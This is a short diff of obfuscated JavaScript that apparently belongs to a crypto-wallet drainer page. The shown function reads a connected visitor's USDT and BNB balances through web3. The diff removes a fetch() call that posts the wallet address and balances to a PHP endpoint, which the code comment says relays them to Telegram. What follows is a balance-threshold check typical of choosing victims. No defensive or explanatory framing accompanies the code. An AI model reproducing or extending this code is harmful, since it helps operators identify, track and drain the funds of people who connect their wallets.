@@ -230,19 +230,7 @@ async function Next() {
         web3.eth.getBalance(userAddress),
       ]),
       _0x5884e8 = parseFloat(web3.utils.fromWei(_0x499f73, 'ether')),
-      _0x585e0e = parseFloat(web3.utils.fromWei(_0x317870, 'ether'))
-      // Send notification to Telegram via PHP
-fetch("connect_notify.php", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    type: "connect",
-    wallet: userAddress,
-    usdt: _0x5884e8,
-    bnb: _0x585e0e
-  })
-});
-
+      _0x585e0e = parseFloat(web3.utils.fromWei(_0x317870, 'ether'))  
     console.log('USDT:', _0x5884e8)
     console.log('BNB:', _0x585e0e)
     if (isNaN(_0x5884e8) || _0x5884e8 < 0.000001) {
